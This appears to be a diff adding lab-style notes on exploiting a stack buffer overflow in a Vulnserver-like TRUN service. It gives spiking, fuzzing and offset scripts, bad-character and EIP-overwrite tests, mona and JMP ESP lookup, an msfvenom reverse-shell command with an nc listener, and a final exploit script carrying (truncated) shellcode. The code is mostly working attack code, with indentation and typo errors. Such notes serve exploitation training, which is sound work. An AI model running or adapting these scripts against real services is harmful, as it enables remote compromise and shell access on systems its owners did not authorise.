@@ -60,6 +60,212 @@ next we are using a PowerShell script
 tools used
 #### Immunity Debugger
 ---
+The process needs to be running on the target machine. We need to run the Immunity  debugger on that machine and attach the running process and check it was running on the debugger.
+
+	We can connect with the running process on the target machine using nc on the host machine. Get the commands allowed to be executed on the running process.
+
+	Step1: Spiking
+		 It is used to test whether the running process is vulnerable or not. Here 
+		
+		stats.spk:
+		s_readline(0);
+		s_string(“STATS “);
+		s_string_variable(0);
+
+		generic_send_tcp 10.10.2.11 44 stats.spk 0 0
+	
+	Step2: Fuzzing:
+		To find the exact bytes where it was breaking
+
+		import socket, time
+
+		# Connect to vulnerable service
+		ip = "127.0.0.1"
+		port = 9999
+
+		# Start with a small payload and increase gradually
+		buffer = "A" * 100
+
+		while True:
+			try:
+				s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+				s.connect((ip, port))
+				s.send(buffer.encode() + b"\r\n")
+				s.close()
+				print(f"Sent {len(buffer)} bytes")
+				buffer += "A" * 100   # increase by 100 each iteration
+				time.sleep(1)
+			except:
+				print(f"Service crashed at {len(buffer)} bytes")
+				break
+
+
+
+	Step3: finding offset:
+		
+		/usr/share/metasploit-framework/toosl/exploit/pattern_create.rb -l  10500
+
+		We are able to find the ESP has been overloaded with the values that we have sent and Take the EIP value from the immunity debugger after it was crashed. The output from below will give exact bytes that are required to overwrite.
+
+		#!/usr/bin/python3
+		import sys, socket
+
+		offset =b”#Place the payload here“
+		try:
+    		soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    		soc.connect(('10.10.1.11', 9999))
+    		pyload=b'TRUN /.:/' + offset  
+    		soc.send(pyload)
+    		soc.close()
+		except:
+   			print("Error: Unable to establish connection with Server")
+    		sys.exit()
+
+
+		/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 10500 -q 396F4338
+
+	Step4: Confirming the Overwrite:
+
+		import socket
+
+		ip = "127.0.0.1"
+		port = 9999
+
+		# Replace with your calculated offset (example: 524)
+		offset = 524
+
+		# Payload structure:
+		# "A" * offset → padding
+		# "B" * 4      → overwrite EIP
+		# "C" * rest   → filler
+		payload = "A" * offset + "B" * 4 + "C" * (1000 - offset - 4)
+
+		try:
+   			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    		s.connect((ip, port))
+    		s.send(payload.encode() + b"\r\n")
+    		s.close()
+    		print(f"Payload of {len(payload)} bytes sent")
+		except:
+    		print("Connection failed")
+
+	Step 5: Badchars checks
+
+		import socket
+
+		ip = "127.0.0.1"
+		port = 9999
+
+		# Replace with your calculated offset (example: 524)
+		offset = 524
+
+		# Generate all possible byte values from \x01 to \xff
+		# (skip \x00 initially since it's almost always a bad char)
+		badchars = "".join([chr(x) for x in range(1, 256)])
+
+		payload = "A" * offset
+		payload += "B" * 4              # Overwrite EIP with BBBB
+		payload += badchars             # Append all test bytes
+
+		try:
+    		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    		s.connect((ip, port))
+    		s.send(payload.encode('latin-1') + b"\r\n")
+    		s.close()
+    	print(f"Payload of {len(payload)} bytes sent with badchars")
+		except:
+    		print("Connection failed")
+
+	Step 6: Finding the right module
+	
+		Download mona.py and place it in the Immunity debugger installed folders -> pycommands
+
+		In Immunity debugger -> in the search box below -> !mona modules
+		Find the module with no memory protection from the table with value set as False
+
+
+	Step 7: Find  return address of the vulnerable module
+	
+		JMS ESP  == ffe4
+	
+		!mona find -s “\xff\xe4” -m essfunc.dll
+
+		Note down the return address
+
+	Step 8: Find If we can able to overwrite the EIP with return address
+
+		import socket
+
+		ip = "127.0.0.1"
+		port = 9999
+
+		# Replace with your calculated offset (example: 524)
+		offset = 524
+
+		# Replace with the JMP ESP address you found (example: 0x625011AF)
+		# Remember to write it in little-endian format
+		jmp_esp = "\xAF\x11\x50\x62"
+
+		# Build payload
+		payload = "A" * offset
+		payload += jmp_esp              # Overwrite EIP with JMP ESP address
+		payload += "C" * (1000 - offset - 4)  # Filler
+
+		try:
+    		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    		s.connect((ip, port))
+    		s.send(payload.encode('latin-1') + b"\r\n")
+    		s.close()
+   			print(f"Payload of {len(payload)} bytes sent with JMP ESP overwrite")
+		except:
+    		print("Connection failed")
+
+	Step 9: Exploiting bufferover
+	
+		msfvenom -p windows/shell_reverse_tcp LHOST=<your_ip> LPORT=<your_port> EXITFUNC=thread -b "\x00\x0a\x0d" -f c -a x86
+
+		Listen on your localhost:
+			nc -lvnp 4444
+
+		BufferOverflow exploit:
+			import socket
+
+			ip = "127.0.0.1"
+			port = 9999
+
+			# Replace with your calculated offset (example: 524)
+			offset = 524
+
+			# Replace with the JMP ESP address you found (little-endian format)
+			jmp_esp = "\xAF\x11\x50\x62"   # Example: 0x625011AF
+
+			# NOP sled (helps smooth execution into shellcode)
+			nop_sled = "\x90" * 16
+
+			# msfvenom generated shellcode (example reverse TCP, badchars excluded)
+			# msfvenom -p windows/shell_reverse_tcp LHOST=<your_ip> LPORT=<your_port> EXITFUNC=thread -b "\x00\x0a\x0d" -f c
+			
+			shellcode = (
+			"\xdb\xc0\xd9\x74\x24\xf4\x5a\x31\xc9\xb1\x52\x31\x42\x17..."
+			# truncated for brevity — paste full msfvenom output here
+			)
+
+			# Build final payload
+			payload = "A" * offset
+			payload += jmp_esp
+			payload += nop_sled
+			payload += shellcode
+
+			try:
+   				s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    		 	s.connect((ip, port))
+    		 	s.send(payload.encode('latin-1') + b"\r\n")
+    		 	s.close()
+    		 	print(f"Payload of {len(payload)} bytes sent")
+			except:
+    			print("Connection failed")
+
+
 
 ## Privilege Escalation
 
